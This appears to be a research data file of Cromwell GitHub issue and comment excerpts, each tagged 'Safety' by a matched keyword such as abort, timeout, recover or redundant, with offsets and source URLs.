-Dbackend.providers.Local.config.filesystems.local.localization.0=""cached-copy"" -jar server/target/scala-2.12/cromwell-41-*-SNAP.jar run centaur/src/main/resources/standardTestCases/cached_copy/cached_copy.wdl` . Is there a way to integrate such a test in scalatest file? I have tried the `.par` method, but that did not quite work. I hope you will consider this PR as it solves an important issue for us. Thanks!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900:3013,safe,safety,3013,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900,2,['safe'],"['safe', 'safety']"
Safety,"Per Khalid's comments above we may want a new ticket to address the inconsistency in the WA / WEA supervision strategy wrt parent / child interactions: when the WEA died the the WA's supervision strategy said `Stop` (do not restart the crashed WEA), but then the WA sent the defunct WEA an abort message. The WA then parked itself in `WorkflowAbortingState` and waited for a `WorkflowExecutionAbortedResponse` that would never be sent from a WEA that no longer existed. . While the changes in this PR prevent the WEA from crashing in this specific (and alarmingly ordinary) circumstance (hooray!), I agree there are still general structural issues in the WA / WEA relationship we should address separately.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5595#issuecomment-665755219:290,abort,abort,290,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5595#issuecomment-665755219,1,['abort'],['abort']
Safety,"Per standup this morning we've decided to close this. The requested functionality is problematic on a few levels:. JSON runtime attributes are currently interpreted as WdlExpressions after going through coercion, which presently is a backend-dependent process as only the backend knows the accepted runtime attribute coercions. While currently it might appear safe to treat the default runtime attribute JSON values as WDL with a `WdlExpression.fromString`, that's an assumption of WDL / JSON expression equivalence not made elsewhere in Cromwell and it seems questionable to pioneer that here. Currently Cromwell's backend assignments happen at initialization time, but in the future Cromwell's backend dispatch is likely to become more sophisticated and dynamic. It therefore wouldn't be possible to say at workflow initialization time the backend to which a call was fated, which would mean the default runtime attribute handling would need to happen in the various `FooRuntimeAttributes` classes as it does now. The refactor proposed here would actually remove the default runtime attribute handling at call execution time and therefore make dynamic dispatch more difficult to add in the future. Finally, while it appears technically possible to doctor tasks with workflow option-derived default runtime attributes in `MaterializeWorkflowDescriptorActor`, this makes for some pretty hacky code. I discovered at least 3 spots that needed to be updated:; - backendAssignment values; - NamespaceWithWorkflow -> tasks; - NamespaceWithWorkflow -> workflow -> children -> tasks. That last item was particularly hideous since `Workflow#children` is explicitly write-once. I got around this with subclassing, but I felt bad about myself afterward.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1076#issuecomment-238635247:360,safe,safe,360,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1076#issuecomment-238635247,1,['safe'],['safe']
Safety,"Perf testing has shown that removing this query improves CC time and reduces DB load (see last row in CC google doc); Unclear if it's worth keeping it as a configurable thing ?; This keeps storing the individual hashes, it just stops using them for ""fast"" cache miss detection.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4121:267,detect,detection,267,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4121,1,['detect'],['detection']
Safety,"Persist when jobs are ""Started"" (or running) and ""Aborted"" on the engine side for the duration of the workflow",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3378:50,Abort,Aborted,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3378,1,['Abort'],['Aborted']
Safety,Please don't comment any more here. Will re-open against Job Avoidance branch with changes made.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/276#issuecomment-154528182:61,Avoid,Avoidance,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/276#issuecomment-154528182,1,['Avoid'],['Avoidance']
Safety,"Post rebase, please:; - change `/workflow` to `/workflows`; - add the `version` to the making it `/workflows/:version/:id/abort`; - add the response annotation to the `200` response; - double check that you can create and send an abort request via the ui (`sbt 'run server'`, then visit [/swagger](http://localhost:8000/swagger)). With the edits above this PR looks good to go for me. Besides that, the un-DRYness of swagger and akka continue to make my skin crawl, but I don't know any better best practices.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/114#issuecomment-125854264:122,abort,abort,122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/114#issuecomment-125854264,2,['abort'],['abort']
Safety,Potential hotfix candidate but would be nice to know why these empty queues are appearing in the first place. An attempt to recover from (though probably not fix the underlying cause of) tokens going missing due to stack traces like:; ```; [cromwell-system-akka.actor.default-dispatcher-1158] ERROR akka.actor.OneForOneStrategy - dequeue on empty queue; java.util.NoSuchElementException: dequeue on empty queue; 	at scala.collection.immutable.Queue.dequeue(Queue.scala:155); 	at cromwell.engine.workflow.tokens.TokenQueue.recursingDequeue(TokenQueue.scala:63); 	at cromwell.engine.workflow.tokens.TokenQueue.dequeue(TokenQueue.scala:50); 	at cromwell.engine.workflow.tokens.RoundRobinQueueIterator.$anonfun$findFirst$1(RoundRobinQueueIterator.scala:46); 	at cromwell.engine.workflow.tokens.RoundRobinQueueIterator.$anonfun$findFirst$1$adapted(RoundRobinQueueIterator.scala:46); 	at scala.collection.immutable.Stream.$anonfun$map$1(Stream.scala:415); 	at scala.collection.immutable.Stream$Cons.tail(Stream.scala:1169); 	at scala.collection.immutable.Stream$Cons.tail(Stream.scala:1159); 	at scala.collection.immutable.StreamIterator.$anonfun$next$1(Stream.scala:1058); 	at scala.collection.immutable.StreamIterator$LazyCell.v$lzycompute(Stream.scala:1047); 	at scala.collection.immutable.StreamIterator$LazyCell.v(Stream.scala:1047); 	at scala.collection.immutable.StreamIterator.hasNext(Stream.scala:1052); 	at scala.collection.TraversableOnce.collectFirst(TraversableOnce.scala:144); 	at scala.collection.TraversableOnce.collectFirst$(TraversableOnce.scala:132); 	at scala.collection.AbstractTraversable.collectFirst(Traversable.scala:104); 	at cromwell.engine.workflow.tokens.RoundRobinQueueIterator.findFirst(RoundRobinQueueIterator.scala:48); 	at cromwell.engine.workflow.tokens.RoundRobinQueueIterator.next(RoundRobinQueueIterator.scala:32); 	at cromwell.engine.workflow.tokens.RoundRobinQueueIterator.next(RoundRobinQueueIterator.scala:10); 	at scala.collection.Iterator$SliceIterator.next(Itera,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4909:124,recover,recover,124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4909,1,['recover'],['recover']
Safety,Preemptible recovery from a checkpointing file [BW-460],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6137:12,recover,recovery,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6137,1,['recover'],['recovery']
Safety,"Probably. On Wed, Apr 5, 2017 at 10:56 AM Kate Voss <notifications@github.com> wrote:. > @dvoet <https://github.com/dvoet> I'm going through the backlog and I was; > wondering if you're still seeing this problem. Aborts are a known issue for; > Cromwell but I wasn't sure if a newer version of Cromwell happened to do; > this better. If so, I'll close this out, if not I'll keep it around for; > when we fix aborts.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1885#issuecomment-291888077>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ABc2tSUYfndPSfSEpNFx6Aq72x98Src7ks5rs6uVgaJpZM4Lpr-l>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1885#issuecomment-291919797:213,Abort,Aborts,213,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1885#issuecomment-291919797,2,"['Abort', 'abort']","['Aborts', 'aborts']"
Safety,"Produces a 500 error like; ```; {; ""status"": ""error"",; ""message"": ""Statement cancelled due to timeout or client request""; }; ```; TODO: if the 55-second request timeout fires and kills the request, we should still make sure the 60-second query kill also gets logged somehow.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5087:94,timeout,timeout,94,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5087,2,['timeout'],['timeout']
Safety,"Proposed in the [PR for HTTPS imports](https://github.com/broadinstitute/cromwell/pull/2758) by @kcibul:. As a **user configuring Cromwell**, I want **the option to disable HTTPs imports**, so that **I can protect my system from possible security risks**. - Effort: Small; - Risk: Small; - Business value: Medium",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2773:247,risk,risks,247,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2773,2,"['Risk', 'risk']","['Risk', 'risks']"
Safety,Provides WES status and abort endpoints directly to the Cromwell server.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4425:24,abort,abort,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4425,1,['abort'],['abort']
Safety,Pull docker images before running tests with short timeouts BT-144 BT-146,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6228:51,timeout,timeouts,51,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6228,1,['timeout'],['timeouts']
Safety,Put the binding timeout back to where it was in spray-land,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2478:16,timeout,timeout,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2478,1,['timeout'],['timeout']
Safety,Q: Ever wonder why the first two `checkDescriptions` always failed in centaur?; A: Because out timeout handler was eager instead of lazy 🤦‍♂,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5424:95,timeout,timeout,95,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5424,1,['timeout'],['timeout']
Safety,Race conditions aborting,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1521:16,abort,aborting,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1521,1,['abort'],['aborting']
Safety,Rawls is periodically getting 404s when calling our `abort` endpoint. It resends the 404 every minute.; ; These accumulate over time so eventually Rawls is sending multiple aborts per minute.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4767:53,abort,abort,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4767,2,['abort'],"['abort', 'aborts']"
Safety,"Re: `WorkflowManagerActorSpec`, over in my current PR I bumped up the event message timeouts, since it seemed to be taking more than 3 seconds for `ScatterWdl` to finish running.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/268#issuecomment-153539194:84,timeout,timeouts,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/268#issuecomment-153539194,1,['timeout'],['timeouts']
Safety,"Re: redundant test code, everything is separate as far as I can tell, including looking at the coverage counts in coveralls. The various tests I see are:. Existing in cromwell pre-PR:; - Test the cromwell swagger _JSON_ is valid according to the swagger specification; - Test that the cromwell swagger route serves up the json to the expected URL. Now as of this PR:. - Test that common code for serving up a swagger endpoint can serve; - json or yaml swagger; - [CORS](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) support; - Utility for redirecting browser requests to `/` to the correct swagger UI. Also included in this PR:; - Ensure that ""wrapping"" a route works, serving all wrapped routes under a new prefix like `/api/*`; - Ensure that common code for easier spray-can binding works",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2093#issuecomment-289486065:4,redund,redundant,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2093#issuecomment-289486065,1,['redund'],['redundant']
Safety,Recover from Docker image hash failures to fail the workflow.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/333:0,Recover,Recover,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/333,1,['Recover'],['Recover']
Safety,Recover from database failures when reading the workflow store. Develop edition,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2150:0,Recover,Recover,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2150,1,['Recover'],['Recover']
Safety,Recover from database failures when reading the workflow store. Hotfix edition,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2149:0,Recover,Recover,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2149,1,['Recover'],['Recover']
Safety,Recover support for Local PBE,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/666:0,Recover,Recover,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/666,1,['Recover'],['Recover']
Safety,Recovery functionality for HtCondor backend. Closes #1249.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1250:0,Recover,Recovery,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1250,1,['Recover'],['Recovery']
Safety,Recovery support for JES PBE,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/751:0,Recover,Recovery,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/751,1,['Recover'],['Recovery']
Safety,Recovery support for SGE Backend,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1162:0,Recover,Recovery,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1162,1,['Recover'],['Recovery']
Safety,Redundant. we're already on 4.10.4,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5752#issuecomment-729792679:0,Redund,Redundant,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5752#issuecomment-729792679,1,['Redund'],['Redundant']
Safety,Ref #3259: SGE jobs still in queue after workflow abort,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3325:50,abort,abort,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3325,1,['abort'],['abort']
Safety,Refactor job aborts via EJEA,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1504:13,abort,aborts,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1504,1,['abort'],['aborts']
Safety,Reflect Backend Abort Status more accurately,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1139:16,Abort,Abort,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1139,1,['Abort'],['Abort']
Safety,"Regarding aborts, @Horneth made significant changes to aborts in Cromwell 30 (coming soon!) that should make it easier and more reliable to abort jobs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2845#issuecomment-344392351:10,abort,aborts,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2845#issuecomment-344392351,3,['abort'],"['abort', 'aborts']"
Safety,"Regarding the supervision/exceptions-- for better or worse, our akka Actors are still using a lot of scala Futures. In the case of the call to `copyCachedOutputs`, the entire method call is wrapped in a `Future.apply()` via `BackendCacheHitCopyingActor.receive`:. ``` scala; def receive: Receive = LoggingReceive {; case CopyOutputsCommand(simpletons, jobDetritus, returnCode) =>; performActionThenRespond(Future(copyCachedOutputs(simpletons, jobDetritus, returnCode)), onFailure = cachingFailed, andThen = context stop self); case AbortJobCommand =>; abort(); context.parent ! AbortedResponse(jobDescriptor.key); context stop self; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1439#issuecomment-248343848:532,Abort,AbortJobCommand,532,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1439#issuecomment-248343848,4,"['Abort', 'abort']","['AbortJobCommand', 'AbortedResponse', 'abort']"
Safety,Remove abort server support from CromIAM,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4596:7,abort,abort,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4596,1,['abort'],['abort']
Safety,Remove cromiam abort BA-4596,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5215:15,abort,abort,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5215,1,['abort'],['abort']
Safety,Remove redundant WaitingForQueueSpace execution status [BA-6487 prereq],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5590:7,redund,redundant,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5590,1,['redund'],['redundant']
Safety,Remove redundant WaitingForQueueSpace status [BW-387],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6034:7,redund,redundant,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6034,1,['redund'],['redundant']
Safety,"Remove redundant nested /project directory, ignore BSP [no JIRA]",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5931:7,redund,redundant,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5931,1,['redund'],['redundant']
Safety,Removes gap between workflow submission and abort request,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2759:44,abort,abort,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2759,1,['abort'],['abort']
Safety,"Replacing `awaitCond` with `eventually` we should also get a better failure message than ""timeout expired""",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1442:90,timeout,timeout,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1442,1,['timeout'],['timeout']
Safety,RequestSender.java:140); at org.asynchttpclient.netty.request.NettyRequestSender.sendRequest(NettyRequestSender.java:111); at org.asynchttpclient.DefaultAsyncHttpClient.execute(DefaultAsyncHttpClient.java:240); at org.asynchttpclient.DefaultAsyncHttpClient.executeRequest(DefaultAsyncHttpClient.java:209); at org.asynchttpclient.BoundRequestBuilder.execute(BoundRequestBuilder.java:35); at com.softwaremill.sttp.asynchttpclient.AsyncHttpClientBackend.$anonfun$send$1(AsyncHttpClientBackend.scala:53); at com.softwaremill.sttp.asynchttpclient.AsyncHttpClientBackend.$anonfun$send$1$adapted(AsyncHttpClientBackend.scala:42); at cats.effect.IO$.$anonfun$async$1(IO.scala:1042); at cats.effect.IO$.$anonfun$async$1$adapted(IO.scala:1040); at cats.effect.internals.IORunLoop$RestartCallback.start(IORunLoop.scala:329); at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:118); at cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); at cats.effect.IO.unsafeRunAsync(IO.scala:269); at cats.effect.IO.unsafeToFuture(IO.scala:341); at cromwell.languages.util.ImportResolver$.$anonfun$httpResolverWithHeaders$1(ImportResolver.scala:92); at common.transforms.package$CheckedAtoB$.$anonfun$firstSuccess$2(package.scala:25); at scala.collection.LinearSeqOptimized.foldLeft(LinearSeqOptimized.scala:122); at scala.collection.LinearSeqOptimized.foldLeft$(LinearSeqOptimized.scala:118); at scala.collection.immutable.List.foldLeft(List.scala:86); at common.transforms.package$CheckedAtoB$.$anonfun$firstSuccess$1(package.scala:22); at cats.data.Kleisli.$anonfun$andThen$1(Kleisli.scala:37); at wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$.wdl$draft3$transforms$wdlom2wom$FileElementToWomBundle$$importWomBundle(FileElementToWomBundle.scala:101); at wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.$anonfun$toWomBundle$11(FileElementToWomBundle.scala:74); at cats.instances.VectorInstances$$anon$1.$anonfun$traverse$2(vector.scala:77); at cats.i,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3977:2654,unsafe,unsafeRunAsync,2654,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3977,1,['unsafe'],['unsafeRunAsync']
Safety,Requesting re-review because this now includes a less-likely-to-be-made-redundant unit test,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5993#issuecomment-719024604:72,redund,redundant,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5993#issuecomment-719024604,1,['redund'],['redundant']
Safety,Rerun the abort id,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7465:10,abort,abort,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7465,1,['abort'],['abort']
Safety,Response timeout does not return Content-Type: `application/json`,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/947:9,timeout,timeout,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/947,1,['timeout'],['timeout']
Safety,ResponseStage.handleResponse(HandleResponseStage.java:73); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:58); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:41); 	at software.amazon.awssdk.core.internal.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:205); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:63); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:36); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:77); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:39); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.doExecute(RetryableStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.execute(RetryableStage.java:88); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage.execute(RetryableStage.java:64); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage.execute(RetryableStage.java:44); 	at software.amazon.awssdk.core.internal.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:205); 	at software.amazon.awssdk.core.internal.http.StreamManagingStage.execute(StreamManagingStage.java:51); 	at software.amazon.awssdk.core.internal.http.StreamManagingStage.execute(StreamManagingStage.java:33); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallTimeoutTrackingStage.executeWithTimer(ApiCallTimeoutTrackingStage.java:79,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119:1557,Timeout,TimeoutExceptionHandlingStage,1557,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119,2,['Timeout'],['TimeoutExceptionHandlingStage']
Safety,Restart / Recover should not kick off until services have initialized and Liquibase has run,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1196:10,Recover,Recover,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1196,1,['Recover'],['Recover']
Safety,Restart/recover migration. Closes #1119,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1340:8,recover,recover,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1340,1,['recover'],['recover']
Safety,Return 503 on timeouts,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3458:14,timeout,timeouts,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3458,1,['timeout'],['timeouts']
Safety,Return Spray timeouts as Json Closes #947,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1133:13,timeout,timeouts,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1133,1,['timeout'],['timeouts']
Safety,"Reviewer wheel hasn't been rolled-- but IMHO the tag name is overly specific. I'd say perhaps even just use the `PostMVP` tag or `ignore` with a TODO as to what's going on, until we come up with a fix for our supervision model / retries for initializing the database. `MainSpec`'s timeouts happen more frequently, but in my repeated tests the corpse services _seemed_ to be killing [other tests too](https://s3.amazonaws.com/archive.travis-ci.org/jobs/143093948/log.txt) in Travis:; - `SingleToArrayCoercionSpec`; - `EmptyOutputSpec`; - `InputLocalizationWorkflowSpec`; - `LocalBackendSpec`; - `BadTaskOutputWorkflowSpec`; - `ReadTsvWorkflowSpec`; - `GlobbingWorkflowSpec`; - `MultiLineCommandWorkflowSpec`; - `FileSizeWorkflowSpec`; - `WriteTsvSpec`; - `WriteLinesSpec`; - `CromwellApiServiceSpec`; - … plus (at least) one spec that seems to be zombieing the entire test suite such that it times out",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1145#issuecomment-231899875:281,timeout,timeouts,281,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1145#issuecomment-231899875,1,['timeout'],['timeouts']
Safety,"Right, I should have mentioned that my WDL pipeline failed. I received errors such as the following:; ```; ...; {; ""causedBy"": [; {; ""causedBy"": [; {; ""message"": ""504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media"",; ""causedBy"": []; }; ],; ""message"": ""Could not read from gs://mccarroll-mocha/cromwell/cromwell-executions/mocha/86d47e9a-5745-4ec0-b4eb-0164f073e5f4/call-idat2gtc/shard-73/rc: 504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media""; }; ],; ""message"": ""[Attempted 1 time(s)] - IOException: Could not read from gs://mccarroll-mocha/cromwell/cromwell-executions/mocha/86d47e9a-5745-4ec0-b4eb-0164f073e5f4/call-idat2gtc/shard-73/rc: 504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media""; }; ],; ""message"": ""Workflow failed""; ```; And the pipeline did not proceed (even if all tasks run until that point seemed to be reported as completed successfully).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5344#issuecomment-760312719:175,Timeout,Timeout,175,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5344#issuecomment-760312719,3,['Timeout'],['Timeout']
Safety,"Right. When these issues come up they're part of a tension between people using docker and people using HPC on shared filesystems (who almost always are **not** using docker). . What we've done in the past has been to detect if the context is docker - if so, stick with something more permissive and if not lock it down. YMMV and all of that",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3721#issuecomment-394394286:218,detect,detect,218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3721#issuecomment-394394286,1,['detect'],['detect']
Safety,Robustify aborts to PRECONDITION_FAILED [BT-450] [CROM-6829],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6568:10,abort,aborts,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6568,1,['abort'],['aborts']
Safety,"Run @ruchim 's Travis test in a different mode, or branch, that shuts down and brings back up. Does a count right after to check that the right number of jobs are recovered (no duplicates). TO DO:; - [ ] Make sure you have as many JES jobs as you think you have; - [ ] If not, fix it!; - [ ] If so, yay!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2111:163,recover,recovered,163,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2111,1,['recover'],['recovered']
Safety,Run abort tests sequentially in centaur,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3042:4,abort,abort,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3042,1,['abort'],['abort']
